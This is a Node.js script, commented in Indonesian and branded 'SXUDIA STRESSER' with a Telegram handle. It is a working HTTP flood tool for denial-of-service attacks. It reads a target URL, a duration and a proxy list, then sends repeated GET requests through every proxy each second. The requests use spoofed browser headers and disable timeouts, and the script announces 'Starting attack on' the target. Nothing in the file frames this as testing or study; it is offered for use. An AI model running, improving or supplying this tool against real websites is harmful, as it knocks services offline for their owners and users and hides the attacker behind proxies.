const https = require('https');
const fs = require('fs');
const { Worker, isMainThread, workerData } = require('worker_threads');
const { URL } = require('url');
const HttpsProxyAgent = require('https-proxy-agent'); // Perbaiki cara impor

if (isMainThread) {
    if (process.argv.length < 7) {
        console.error("Usage: node script.js <url> <time> <rps> <threads> <proxy.txt>");
        process.exit(1);
    }

    const target = {
        url: process.argv[2],
        time: parseInt(process.argv[3], 10),
        rps: parseInt(process.argv[4], 10),
        threads: parseInt(process.argv[5], 10),
        proxyFile: process.argv[6]
    };

    console.log(`Starting attack on ${target.url} for ${target.time} seconds...`);
    const worker = new Worker(__filename, { workerData: target });
    worker.on('exit', () => console.log(`Attack on ${target.url} completed.`));
} else {
    const { url, time, rps, threads, proxyFile } = workerData;
    const target = new URL(url);
    const PROXY_LIST = proxyFile ? fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(p => p.trim()) : [];

    const HTTP_OPTIONS = {
        hostname: target.hostname,
        port: target.port || 443,
        path: target.pathname,
        method: 'GET',
        headers: {
            'Host': target.hostname,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' +
                          '(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Connection': 'keep-alive', // Memastikan koneksi tetap hidup
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache'
        }
    };

    function sendRequest() {
        const interval = setInterval(() => {
            console.log(`SXUDIA STRESSER TELE @abibsaudia`);

            // Kirim permintaan untuk setiap proxy secara bersamaan
            PROXY_LIST.forEach(proxy => {
                const agent = new HttpsProxyAgent(`http://${proxy}`); // Gunakan proxy untuk setiap permintaan

                const reqOptions = { ...HTTP_OPTIONS, agent };

                const req = https.request(reqOptions, res => {
                    res.on('data', () => {});
                });

                req.on('error', err => {
                    // Tangani error jika diperlukan
                });

                req.setTimeout(0); // Nonaktifkan timeout, menghindari penundaan
                req.end();
            });
        }, 1000);

        // Menghentikan pengiriman request setelah waktu yang ditentukan
        setTimeout(() => clearInterval(interval), time * 1000);
    }

    // Mulai mengirim permintaan
    sendRequest();
}
